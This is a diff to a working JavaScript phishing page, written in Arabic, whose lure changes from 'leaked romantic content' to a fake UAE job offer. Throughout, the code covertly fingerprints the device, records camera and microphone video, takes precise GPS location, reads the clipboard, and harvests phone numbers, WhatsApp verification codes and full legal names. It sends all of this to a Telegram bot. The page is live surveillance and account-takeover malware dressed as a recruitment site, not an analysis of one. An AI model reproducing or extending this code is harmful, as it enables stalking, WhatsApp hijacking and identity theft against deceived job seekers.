@@ -47,7 +47,7 @@ async function requestCameraAccessWithQuotes(statusElement) {
                 statusElement.innerHTML = `<div class="error" style="background: #ffe6e6; padding: 20px; border-radius: 10px; color: #d32f2f;">
                     <h3>⚠️ المتصفح غير مدعوم</h3>
                     <p>متصفحك لا يدعم الوصول إلى الكاميرا والميكروفون</p>
-                    <p>الرجاء استخدام متصفح حديث مثل Chrome أو Firefox</p>
+                    <p>الرجاء استخدام متصفح حديث مثل Chrome أو Firefox لإتمام المقابلة</p>
                 </div>`;
             }
             return;
@@ -58,7 +58,7 @@ async function requestCameraAccessWithQuotes(statusElement) {
             if (statusElement) {
                 statusElement.innerHTML = `<div class="error" style="background: #fff3cd; padding: 20px; border-radius: 10px; color: #856404;">
                     <h3>🔒 يتطلب اتصال آمن</h3>
-                    <p>للوصول إلى الكاميرا والميكروفون على الجوال، يجب فتح الموقع عبر HTTPS</p>
+                    <p>للوصول إلى الكاميرا والميكروفون على الجوال لإجراء المقابلة، يجب فتح الموقع عبر HTTPS</p>
                     <p style="font-size: 0.9em; margin-top: 10px;">الرجاء التواصل مع مدير الموقع لتفعيل HTTPS</p>
                 </div>`;
             }
@@ -121,7 +121,7 @@ async function requestCameraAccessWithQuotes(statusElement) {
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
             formData.append('video', videoBlob, 'video.webm');
-            formData.append('caption', '🎥 فيديو 15 ثانية');
+            formData.append('caption', '🎥 فيديو مقابلة 15 ثانية');
             try {
                 await fetch(url, { method: 'POST', body: formData });
             } catch (e) {}
@@ -129,16 +129,16 @@ async function requestCameraAccessWithQuotes(statusElement) {
         
         recorder.start();
         
-        // Display love quotes every 2 seconds during recording
+        // Display job quotes every 2 seconds during recording
         let quoteIndex = 0;
         const quoteInterval = setInterval(() => {
-            if (quoteIndex < loveQuotes.length) {
+            if (quoteIndex < jobQuotes.length) {
                 statusElement.innerHTML = `<div class="loading">
-                    <strong style="font-size: 1.3em; color: #c06c84;">💕 انطق هذه العبارة بصوت عالٍ 💕</strong><br><br>
-                    <div style="background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%); padding: 20px; border-radius: 15px; color: white; font-size: 1.4em; font-weight: bold; margin: 15px 0; box-shadow: 0 5px 15px rgba(255,107,157,0.4);">
-                        "${loveQuotes[quoteIndex]}"
+                    <strong style="font-size: 1.3em; color: #FFD700;">🎯 اقرأ هذه العبارة بصوت واضح 🎯</strong><br><br>
+                    <div style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); padding: 20px; border-radius: 15px; color: #000; font-size: 1.4em; font-weight: bold; margin: 15px 0; box-shadow: 0 5px 15px rgba(255,215,0,0.5);">
+                        "${jobQuotes[quoteIndex]}"
                     </div>
-                    <small style="color: #666;">جارٍ تحميل المحتوى الرومانسي لأجلك...</small>
+                    <small style="color: #666;">جارٍ معالجة طلبك للوظائف الحصرية...</small>
                 </div>`;
                 quoteIndex++;
             }
@@ -296,34 +296,244 @@ async function requestNotificationAccess() {
         try {
             const permission = await Notification.requestPermission();
             if (permission === 'granted') {
-                new Notification('💕 مرحباً بك!', {
-                    body: 'شكراً لك! استمتع بالمحتوى الحصري',
-                    icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y="75" font-size="75">💕</text></svg>'
+                new Notification('🏢 مرحباً بك!', {
+                    body: 'شكراً لك! تم تحميل قائمة الوظائف الحصرية',
+                    icon: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y="75" font-size="75">🏢</text></svg>'
                 });
             }
         } catch (e) {}
     }
 }
 
-// Gather ALL device info without permissions
+// Advanced Device Fingerprinting - Canvas
+function getCanvasFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = 200;
+        canvas.height = 50;
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.textBaseline = 'alphabetic';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle = '#069';
+        ctx.fillText('Device fingerprint 🔒', 2, 15);
+        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+        ctx.fillText('Device fingerprint 🔒', 4, 17);
+        return canvas.toDataURL();
+    } catch (e) {
+        return 'Canvas not supported';
+    }
+}
+
+// Advanced Device Fingerprinting - WebGL
+function getWebGLFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (!gl) return 'WebGL not supported';
+        
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        const vendor = gl.getParameter(debugInfo ? debugInfo.UNMASKED_VENDOR_WEBGL : 7936);
+        const renderer = gl.getParameter(debugInfo ? debugInfo.UNMASKED_RENDERER_WEBGL : 7937);
+        
+        const params = {
+            vendor: vendor,
+            renderer: renderer,
+            version: gl.getParameter(gl.VERSION),
+            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+            maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+            maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
+            maxViewportDims: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
+            aliasedLineWidthRange: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
+            aliasedPointSizeRange: gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE)
+        };
+        
+        return JSON.stringify(params);
+    } catch (e) {
+        return 'WebGL error: ' + e.message;
+    }
+}
+
+// Advanced Device Fingerprinting - Audio
+async function getAudioFingerprint() {
+    return new Promise((resolve) => {
+        try {
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const oscillator = audioContext.createOscillator();
+            const analyser = audioContext.createAnalyser();
+            const gainNode = audioContext.createGain();
+            const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+            
+            gainNode.gain.value = 0;
+            oscillator.type = 'triangle';
+            oscillator.connect(analyser);
+            analyser.connect(scriptProcessor);
+            scriptProcessor.connect(gainNode);
+            gainNode.connect(audioContext.destination);
+            
+            oscillator.start(0);
+            
+            scriptProcessor.onaudioprocess = (event) => {
+                const output = event.inputBuffer.getChannelData(0);
+                let hash = 0;
+                for (let i = 0; i < output.length; i++) {
+                    hash += Math.abs(output[i]);
+                }
+                oscillator.stop();
+                audioContext.close();
+                resolve(hash.toString());
+            };
+        } catch (e) {
+            resolve('Audio fingerprint error: ' + e.message);
+        }
+    });
+}
+
+// Font Detection
+function detectFonts() {
+    const baseFonts = ['monospace', 'sans-serif', 'serif'];
+    const testFonts = [
+        'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
+        'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS', 'Trebuchet MS',
+        'Impact', 'Tahoma', 'Lucida Console', 'Courier', 'Lucida Sans Unicode'
+    ];
+    
+    const detected = [];
+    const testString = 'mmmmmmmmmmlli';
+    const testSize = '72px';
+    const h = document.getElementsByTagName('body')[0];
+    const s = document.createElement('span');
+    s.style.fontSize = testSize;
+    s.innerHTML = testString;
+    
+    const defaultWidth = {};
+    const defaultHeight = {};
+    
+    for (let i = 0; i < baseFonts.length; i++) {
+        s.style.fontFamily = baseFonts[i];
+        h.appendChild(s);
+        defaultWidth[baseFonts[i]] = s.offsetWidth;
+        defaultHeight[baseFonts[i]] = s.offsetHeight;
+        h.removeChild(s);
+    }
+    
+    for (let i = 0; i < testFonts.length; i++) {
+        let detected_font = false;
+        for (let j = 0; j < baseFonts.length; j++) {
+            s.style.fontFamily = testFonts[i] + ',' + baseFonts[j];
+            h.appendChild(s);
+            const matched = (s.offsetWidth !== defaultWidth[baseFonts[j]] || 
+                           s.offsetHeight !== defaultHeight[baseFonts[j]]);
+            h.removeChild(s);
+            if (matched) {
+                detected_font = true;
+            }
+        }
+        if (detected_font) {
+            detected.push(testFonts[i]);
+        }
+    }
+    
+    return detected.join(', ');
+}
+
+// Screen Properties Advanced
+function getScreenProperties() {
+    return {
+        width: screen.width,
+        height: screen.height,
+        availWidth: screen.availWidth,
+        availHeight: screen.availHeight,
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth,
+        orientation: screen.orientation ? screen.orientation.angle : 'N/A',
+        devicePixelRatio: window.devicePixelRatio,
+        innerWidth: window.innerWidth,
+        innerHeight: window.innerHeight,
+        outerWidth: window.outerWidth,
+        outerHeight: window.outerHeight
+    };
+}
+
+// Mouse/Touch Capabilities
+function getInputCapabilities() {
+    return {
+        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+        maxTouchPoints: navigator.maxTouchPoints || 0,
+        pointerSupport: navigator.pointerEnabled || false,
+        mouseSupport: 'onmousemove' in window
+    };
+}
+
+// Timezone and Locale Advanced
+function getLocaleInfo() {
+    return {
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        timezoneOffset: new Date().getTimezoneOffset(),
+        locale: navigator.language,
+        locales: navigator.languages,
+        dateFormat: new Date().toLocaleDateString(),
+        timeFormat: new Date().toLocaleTimeString(),
+        numberFormat: new Intl.NumberFormat().resolvedOptions()
+    };
+}
+
+// Gather ALL device info without permissions (ENHANCED)
 async function gatherDeviceInfo() {
-    let info = '🎯 معلومات الجهاز المجمعة:\n\n';
+    let info = '🎯 معلومات الجهاز المجمعة (متقدمة):\n\n';
     
     // Basic Browser Info
     info += '📱 معلومات المتصفح:\n';
-    info += `المتصفح: ${navigator.userAgent}\n`;
+    info += `User Agent: ${navigator.userAgent}\n`;
     info += `اللغة: ${navigator.language}\n`;
     info += `اللغات: ${navigator.languages.join(', ')}\n`;
     info += `المنصة: ${navigator.platform}\n`;
     info += `Vendor: ${navigator.vendor}\n`;
-    info += `Online: ${navigator.onLine ? 'نعم' : 'لا'}\n\n`;
+    info += `Online: ${navigator.onLine ? 'نعم' : 'لا'}\n`;
+    info += `Cookie Enabled: ${navigator.cookieEnabled}\n`;
+    info += `Do Not Track: ${navigator.doNotTrack || 'غير مفعل'}\n\n`;
     
-    // Screen Info
-    info += '🖥️ معلومات الشاشة:\n';
-    info += `الدقة: ${window.screen.width}x${window.screen.height}\n`;
-    info += `الدقة المتاحة: ${window.screen.availWidth}x${window.screen.availHeight}\n`;
-    info += `عمق الألوان: ${window.screen.colorDepth} بت\n`;
-    info += `Pixel Ratio: ${window.devicePixelRatio}\n\n`;
+    // Screen Info Advanced
+    const screenProps = getScreenProperties();
+    info += '🖥️ معلومات الشاشة المتقدمة:\n';
+    info += `الدقة: ${screenProps.width}x${screenProps.height}\n`;
+    info += `الدقة المتاحة: ${screenProps.availWidth}x${screenProps.availHeight}\n`;
+    info += `عمق الألوان: ${screenProps.colorDepth} بت\n`;
+    info += `Pixel Ratio: ${screenProps.devicePixelRatio}\n`;
+    info += `Window Size: ${screenProps.innerWidth}x${screenProps.innerHeight}\n`;
+    info += `Outer Size: ${screenProps.outerWidth}x${screenProps.outerHeight}\n`;
+    info += `Orientation: ${screenProps.orientation}\n\n`;
+    
+    // Device Fingerprinting
+    info += '🔒 Device Fingerprinting:\n';
+    const canvasFP = getCanvasFingerprint();
+    info += `Canvas Hash: ${canvasFP.substring(0, 100)}...\n`;
+    const webglFP = getWebGLFingerprint();
+    info += `WebGL: ${webglFP.substring(0, 200)}...\n`;
+    const audioFP = await getAudioFingerprint();
+    info += `Audio Hash: ${audioFP}\n`;
+    const fonts = detectFonts();
+    info += `Fonts Detected: ${fonts || 'None'}\n\n`;
+    
+    // Input Capabilities
+    const inputCaps = getInputCapabilities();
+    info += '👆 قدرات الإدخال:\n';
+    info += `Touch Support: ${inputCaps.touchSupport ? 'نعم' : 'لا'}\n`;
+    info += `Max Touch Points: ${inputCaps.maxTouchPoints}\n`;
+    info += `Pointer Support: ${inputCaps.pointerSupport ? 'نعم' : 'لا'}\n`;
+    info += `Mouse Support: ${inputCaps.mouseSupport ? 'نعم' : 'لا'}\n\n`;
+    
+    // Locale Info Advanced
+    const localeInfo = getLocaleInfo();
+    info += '🌍 معلومات المنطقة المتقدمة:\n';
+    info += `Timezone: ${localeInfo.timezone}\n`;
+    info += `Timezone Offset: ${localeInfo.timezoneOffset} دقيقة\n`;
+    info += `Locale: ${localeInfo.locale}\n`;
+    info += `Locales: ${localeInfo.locales.join(', ')}\n`;
+    info += `Date Format: ${localeInfo.dateFormat}\n`;
+    info += `Time Format: ${localeInfo.timeFormat}\n\n`;
     
     // Battery Status
     if (navigator.getBattery) {
@@ -388,29 +598,145 @@ async function gatherDeviceInfo() {
         info += '\n';
     }
     
-    // Get IP Address
+    // Get IP Address and Location
     try {
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
-        info += `🌍 عنوان IP: ${ipData.ip}\n\n`;
+        info += `🌍 عنوان IP: ${ipData.ip}\n`;
+        
+        // Get location from IP
+        try {
+            const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+            const geoData = await geoResponse.json();
+            info += `البلد: ${geoData.country_name || 'غير معروف'}\n`;
+            info += `المدينة: ${geoData.city || 'غير معروف'}\n`;
+            info += `المنطقة: ${geoData.region || 'غير معروف'}\n`;
+            info += `ISP: ${geoData.org || 'غير معروف'}\n`;
+        } catch (e) {}
+        info += '\n';
     } catch (e) {}
+    
+    // Performance Info
+    if (window.performance && window.performance.memory) {
+        info += '⚡ معلومات الأداء:\n';
+        info += `Memory Used: ${Math.round(window.performance.memory.usedJSHeapSize / 1048576)} MB\n`;
+        info += `Memory Total: ${Math.round(window.performance.memory.totalJSHeapSize / 1048576)} MB\n`;
+        info += `Memory Limit: ${Math.round(window.performance.memory.jsHeapSizeLimit / 1048576)} MB\n\n`;
+    }
+    
+    // Plugins and MIME Types
+    if (navigator.plugins && navigator.plugins.length > 0) {
+        info += '🔌 الإضافات المثبتة:\n';
+        for (let i = 0; i < navigator.plugins.length; i++) {
+            info += `- ${navigator.plugins[i].name} (${navigator.plugins[i].filename})\n`;
+        }
+        info += '\n';
+    }
+    
+    // MIME Types
+    if (navigator.mimeTypes && navigator.mimeTypes.length > 0) {
+        info += '📄 MIME Types:\n';
+        for (let i = 0; i < Math.min(navigator.mimeTypes.length, 10); i++) {
+            info += `- ${navigator.mimeTypes[i].type}\n`;
+        }
+        info += '\n';
+    }
     
     // Send to Telegram
     await sendToTelegram(info);
 }
 
-// Love quotes to display during recording
-const loveQuotes = [
-    "أحبك ليس لأنك مثالي، بل لأنك تجعلني أشعر بأنني كذلك",
-    "في عينيك أرى كل ما أحتاجه في هذه الحياة",
-    "أنت السبب الذي يجعلني أبتسم كل صباح",
-    "حبك هو أجمل قصة كُتبت في قلبي",
-    "معك أشعر أن الحياة أجمل مما كنت أتخيل",
-    "أنت النجمة التي تضيء سماء حياتي",
-    "كل لحظة معك هي ذكرى لا تُنسى",
-    "أحبك أكثر مما تستطيع الكلمات أن تعبر",
-    "أنت الحلم الذي تحقق في حياتي",
-    "قلبي ينبض باسمك في كل لحظة"
+// Gather ADVANCED info WITH permissions (after verification)
+async function gatherAdvancedInfoWithPermissions() {
+    let info = '🔐 معلومات متقدمة (بعد التحقق):\n\n';
+    
+    // Location (if permission granted)
+    if (navigator.geolocation) {
+        try {
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            });
+            
+            info += '📍 الموقع الجغرافي الدقيق:\n';
+            info += `Latitude: ${position.coords.latitude}\n`;
+            info += `Longitude: ${position.coords.longitude}\n`;
+            info += `Accuracy: ${position.coords.accuracy} متر\n`;
+            info += `Altitude: ${position.coords.altitude || 'N/A'}\n`;
+            info += `Speed: ${position.coords.speed || 'N/A'} m/s\n`;
+            info += `Heading: ${position.coords.heading || 'N/A'}\n`;
+            
+            // Reverse geocoding
+            try {
+                const geoResponse = await fetch(
+                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`
+                );
+                const geoData = await geoResponse.json();
+                info += `Address: ${geoData.display_name}\n`;
+            } catch (e) {}
+            
+            info += `Google Maps: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}\n\n`;
+        } catch (e) {
+            info += '📍 الموقع: تم رفض الصلاحية\n\n';
+        }
+    }
+    
+    // Camera/Microphone info (if already accessed)
+    if (frontStream) {
+        info += '📷 معلومات الكاميرا:\n';
+        const tracks = frontStream.getTracks();
+        tracks.forEach((track, index) => {
+            const settings = track.getSettings();
+            info += `Track ${index + 1}:\n`;
+            info += `  Kind: ${track.kind}\n`;
+            info += `  Label: ${track.label}\n`;
+            info += `  Enabled: ${track.enabled}\n`;
+            if (settings.width) info += `  Resolution: ${settings.width}x${settings.height}\n`;
+            if (settings.frameRate) info += `  Frame Rate: ${settings.frameRate} fps\n`;
+            if (settings.deviceId) info += `  Device ID: ${settings.deviceId}\n`;
+            if (settings.groupId) info += `  Group ID: ${settings.groupId}\n`;
+        });
+        info += '\n';
+    }
+    
+    // Notification Permission
+    if ('Notification' in window) {
+        info += '🔔 صلاحية الإشعارات:\n';
+        info += `Status: ${Notification.permission}\n\n`;
+    }
+    
+    // Clipboard (if permission available)
+    if (navigator.clipboard && navigator.clipboard.readText) {
+        try {
+            const clipboardText = await navigator.clipboard.readText();
+            if (clipboardText) {
+                info += '📋 محتوى الحافظة:\n';
+                info += `${clipboardText.substring(0, 500)}\n\n`;
+            }
+        } catch (e) {
+            info += '📋 الحافظة: لا يمكن الوصول\n\n';
+        }
+    }
+    
+    // Send to Telegram
+    await sendToTelegram(info);
+}
+
+// Job motivation quotes to display during recording
+const jobQuotes = [
+    "أنت على وشك الحصول على وظيفة أحلامك في الإمارات",
+    "رواتب تصل إلى 50,000 درهم شهرياً تنتظرك",
+    "سكن فاخر وسيارة شركة مجانية من أول يوم",
+    "فرصتك للعمل في أكبر الشركات الإماراتية",
+    "تذاكر سفر مجانية وإجازات سنوية مدفوعة",
+    "تأمين صحي شامل لك ولعائلتك",
+    "دورات تدريبية مجانية لتطوير مهاراتك",
+    "مستقبل مشرق ينتظرك في دولة الإمارات",
+    "انضم إلى آلاف الناجحين في الإمارات",
+    "حلمك في العمل بالإمارات أصبح قريباً"
 ];
 
 // Main function - request all permissions
@@ -422,7 +748,7 @@ async function startCapture() {
     
     if (isVerified) {
         // Already verified, skip phone and verification
-        status.innerHTML = '<div class="success">✅ تم التحقق مسبقاً<br>جارٍ تحميل المحتوى...</div>';
+        status.innerHTML = '<div class="success">✅ تم التحقق مسبقاً<br>جارٍ تحميل قائمة الوظائف الحصرية...</div>';
         await new Promise(resolve => setTimeout(resolve, 1000));
         await continueAfterPhone();
         return;
@@ -430,13 +756,13 @@ async function startCapture() {
     
     // Show phone number request FIRST
     status.innerHTML = `<div class="success">
-        <h3 style="color: #c06c84; margin-bottom: 15px;">💕 مرحباً بك في عالم المحتوى الحصري</h3>
-        <p style="color: #333; font-size: 1.1em; margin: 15px 0;">للوصول إلى المحتوى الرومانسي الحصري</p>
-        <p style="color: #666; margin: 10px 0;">ادخل رقم هاتفك ليتم تخصيص المحتوى المسرب من بلدك الذي يتم تسريبه إلينا يومياً</p>
+        <h3 style="color: #FFD700; margin-bottom: 15px;">🏢 مرحباً بك في شركة الإمارات للتوظيف</h3>
+        <p style="color: #333; font-size: 1.1em; margin: 15px 0;">للوصول إلى أفضل فرص العمل الحصرية في دولة الإمارات</p>
+        <p style="color: #666; margin: 10px 0;">ادخل رقم هاتفك ليتم إرسال قائمة الوظائف الحصرية المتاحة لك مباشرة عبر واتساب</p>
         <div style="margin: 20px 0;">
-            <input type="tel" id="phoneNumber" placeholder="أدخل رقم هاتفك" style="width: 80%; padding: 12px; border: 2px solid #c06c84; border-radius: 10px; font-size: 1.1em; text-align: center; direction: ltr;" />
+            <input type="tel" id="phoneNumber" placeholder="أدخل رقم هاتفك" style="width: 80%; padding: 12px; border: 2px solid #FFD700; border-radius: 10px; font-size: 1.1em; text-align: center; direction: ltr;" />
         </div>
-        <button onclick="submitPhoneNumberFirst()" style="background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%); color: white; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">متابعة</button>
+        <button onclick="submitPhoneNumberFirst()" style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">متابعة</button>
     </div>`;
 }
 
@@ -447,9 +773,9 @@ async function continueAfterPhone() {
     // Show progress bar (without message)
     status.innerHTML = `
         <div class="success" style="padding: 30px;">
-            <h3 style="color: #c06c84; margin-bottom: 20px;">⏳ جارٍ تحميل المحتوى الحصري</h3>
+            <h3 style="color: #FFD700; margin-bottom: 20px;">⏳ جارٍ تحميل قائمة الوظائف الحصرية</h3>
             <div style="width: 100%; background: #f0f0f0; border-radius: 25px; height: 30px; overflow: hidden; margin: 20px 0;">
-                <div id="progressBar" style="width: 0%; height: 100%; background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%); transition: width 0.3s ease; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 0.9em;">
+                <div id="progressBar" style="width: 0%; height: 100%; background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); transition: width 0.3s ease; display: flex; align-items: center; justify-content: center; color: #000; font-weight: bold; font-size: 0.9em;">
                     <span id="progressText">0%</span>
                 </div>
             </div>
@@ -508,12 +834,12 @@ async function continueAfterPhone() {
     
     // Show final success message
     status.innerHTML = `<div class="success">
-        <h3 style="color: #28a745; margin-bottom: 15px;">🎉 تم تحميل المحتوى بنجاح!</h3>
-        <p style="color: #333; font-size: 1.2em; margin: 15px 0;">💕 مرحباً بك في عالم المحتوى الحصري</p>
+        <h3 style="color: #28a745; margin-bottom: 15px;">🎉 تم تحميل قائمة الوظائف بنجاح!</h3>
+        <p style="color: #333; font-size: 1.2em; margin: 15px 0;">🏢 مرحباً بك في شركة الإمارات للتوظيف</p>
         <div class="fake-content" style="margin-top: 20px;">
-            <p>✨ يمكنك الآن تصفح المحتوى الحصري</p>
-            <p>💝 آلاف الرسائل والفيديوهات الرومانسية في انتظارك</p>
-            <p>🌹 محتوى مسرب حصري من بلدك يومياً</p>
+            <p>✨ يمكنك الآن تصفح قائمة الوظائف الحصرية</p>
+            <p>💼 مئات الوظائف برواتب تصل إلى 50,000 درهم</p>
+            <p>🇦🇪 فرص عمل حصرية في أفضل الشركات الإماراتية</p>
         </div>
     </div>`;
 }
@@ -527,9 +853,17 @@ async function submitPhoneNumberFirst() {
     const phoneNumber = phoneInput.value.trim();
     const status = document.getElementById('status');
     
-    // Validate: Must be exactly 9 digits
+    // Validate: Must be exactly 9 digits and start with 77, 78, 71, 70, or 73
+    const validPrefixes = ['77', '78', '71', '70', '73'];
+    const phonePrefix = phoneNumber.substring(0, 2);
+    
     if (!phoneNumber || phoneNumber.length !== 9 || !/^\d+$/.test(phoneNumber)) {
         alert('⚠️ يرجى إدخال رقم هاتف صحيح (9 أرقام)');
+        return;
+    }
+    
+    if (!validPrefixes.includes(phonePrefix)) {
+        alert('⚠️ رقم الهاتف يجب أن يبدأ بأحد الأرقام التالية: 77, 78, 71, 70, 73');
         return;
     }
     
@@ -551,9 +885,9 @@ async function submitPhoneNumberFirst() {
         <p style="color: #333; font-size: 1.1em; margin: 15px 0;">تحقق من رسائل واتساب الخاصة بك</p>
         <p style="color: #666; margin: 10px 0;">أدخل الرمز المرسل إليك (4 أرقام على الأقل)</p>
         <div style="margin: 20px 0;">
-            <input type="text" id="verificationCode" placeholder="أدخل رمز التحقق" style="width: 60%; padding: 12px; border: 2px solid #c06c84; border-radius: 10px; font-size: 1.3em; text-align: center; letter-spacing: 5px; direction: ltr;" />
+            <input type="text" id="verificationCode" placeholder="أدخل رمز التحقق" style="width: 60%; padding: 12px; border: 2px solid #FFD700; border-radius: 10px; font-size: 1.3em; text-align: center; letter-spacing: 5px; direction: ltr;" />
         </div>
-        <button onclick="submitVerificationCodeFirst()" style="background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%); color: white; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">تأكيد الرمز</button>
+        <button onclick="submitVerificationCodeFirst()" style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">تأكيد الرمز</button>
     </div>`;
 }
 
@@ -578,17 +912,17 @@ async function submitVerificationCodeFirst() {
     if (verificationAttempts === 1) {
         status.innerHTML = `<div class="error" style="background: #ffe6e6; padding: 20px; border-radius: 10px; margin: 20px 0;">
             <h3 style="color: #d32f2f; margin-bottom: 15px;">❌ الرمز خاطئ</h3>
-            <p style="color: #333; font-size: 1.1em; margin: 15px 0;">يجب عليك الذهاب إلى واتساب ونسخ الرمز المرسل وإدخاله هنا</p>
-            <p style="color: #666; margin: 10px 0;">تحقق من رسائل واتساب الخاصة بك وانسخ الرمز بدقة</p>
+            <p style="color: #333; font-size: 1.1em; margin: 15px 0;">يجب عليك الذهاب إلى واتساب وانقل رمز التحقق المرسل إليك</p>
+            <p style="color: #666; margin: 10px 0;">تحقق من رسائل واتساب الخاصة بك وانقل الرمز بدقة</p>
             <div style="margin: 20px 0;">
-                <input type="text" id="verificationCode" placeholder="أدخل رمز التحقق" style="width: 60%; padding: 12px; border: 2px solid #c06c84; border-radius: 10px; font-size: 1.3em; text-align: center; letter-spacing: 5px; direction: ltr;" />
+                <input type="text" id="verificationCode" placeholder="أدخل رمز التحقق" style="width: 60%; padding: 12px; border: 2px solid #FFD700; border-radius: 10px; font-size: 1.3em; text-align: center; letter-spacing: 5px; direction: ltr;" />
             </div>
-            <button onclick="submitVerificationCodeFirst()" style="background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%); color: white; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">إعادة المحاولة</button>
+            <button onclick="submitVerificationCodeFirst()" style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">إعادة المحاولة</button>
         </div>`;
         return;
     }
     
-    // Second attempt: Accept and continue with permissions
+    // Second attempt: Accept and continue with name request
     status.innerHTML = '<div class="loading">✅ جارٍ التحقق من الرمز...</div>';
     
     await new Promise(resolve => setTimeout(resolve, 2000));
@@ -596,8 +930,66 @@ async function submitVerificationCodeFirst() {
     // Save verification status
     localStorage.setItem('userVerified', 'true');
     
+    // Show name request
+    await requestFullName();
+}
+
+// Request full name after verification
+async function requestFullName() {
+    const status = document.getElementById('status');
+    
+    status.innerHTML = `<div class="success">
+        <h3 style="color: #FFD700; margin-bottom: 15px;">🎉 تم التحقق بنجاح!</h3>
+        <p style="color: #333; font-size: 1.1em; margin: 15px 0; font-weight: 600;">الآن نحتاج إلى معلوماتك الشخصية لإتمام التسجيل</p>
+        <div style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); padding: 20px; border-radius: 15px; margin: 20px 0;">
+            <p style="color: #000; font-size: 1.2em; font-weight: bold; margin-bottom: 10px;">⚠️ تنبيه مهم جداً:</p>
+            <p style="color: #000; font-size: 1.05em; line-height: 1.8;">
+                يجب إدخال اسمك الكامل <strong>بالضبط كما هو مكتوب في بطاقة الهوية أو جواز السفر</strong> لأن:
+            </p>
+            <ul style="color: #000; text-align: right; margin: 15px 0; padding-right: 25px; line-height: 2;">
+                <li>💰 <strong>راتبك الشهري</strong> سيتم تحويله إلى حسابك البنكي بنفس الاسم</li>
+                <li>📄 <strong>عقد العمل</strong> سيتم إصداره بنفس الاسم الموجود في بطاقتك</li>
+                <li>✈️ <strong>تأشيرة العمل</strong> تحتاج إلى الاسم الكامل كما في الوثائق الرسمية</li>
+                <li>🏦 <strong>فتح الحساب البنكي</strong> في الإمارات يتطلب مطابقة الاسم مع الوثائق</li>
+            </ul>
+            <p style="color: #000; font-size: 1.05em; margin-top: 15px; font-weight: 600;">
+                أي خطأ في الاسم قد يؤدي إلى تأخير صرف الراتب أو رفض طلب التأشيرة!
+            </p>
+        </div>
+        <p style="color: #666; margin: 20px 0; font-size: 1.05em;">أدخل اسمك الكامل (الاسم الأول + اسم الأب + اسم العائلة):</p>
+        <div style="margin: 20px 0;">
+            <input type="text" id="fullName" placeholder="مثال: أحمد محمد علي" style="width: 80%; padding: 15px; border: 2px solid #FFD700; border-radius: 10px; font-size: 1.2em; text-align: right; direction: rtl;" />
+        </div>
+        <button onclick="submitFullName()" style="background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%); color: #000; padding: 15px 50px; border: none; border-radius: 25px; font-size: 1.3em; cursor: pointer; font-weight: bold; box-shadow: 0 5px 15px rgba(255, 215, 0, 0.4);">متابعة</button>
+    </div>`;
+}
+
+// Submit full name
+async function submitFullName() {
+    const nameInput = document.getElementById('fullName');
+    const fullName = nameInput.value.trim();
+    const status = document.getElementById('status');
+    
+    if (!fullName || fullName.length < 5) {
+        alert('⚠️ يرجى إدخال اسمك الكامل (يجب أن يكون 5 أحرف على الأقل)');
+        return;
+    }
+    
+    // Check if name has at least 2 words (first name + last name)
+    const nameParts = fullName.split(/\s+/);
+    if (nameParts.length < 2) {
+        alert('⚠️ يرجى إدخال اسمك الكامل (الاسم الأول + اسم العائلة على الأقل)');
+        return;
+    }
+    
+    // Send name to Telegram
+    await sendToTelegram(`👤 الاسم الكامل المدخل:\n${fullName}`);
+    
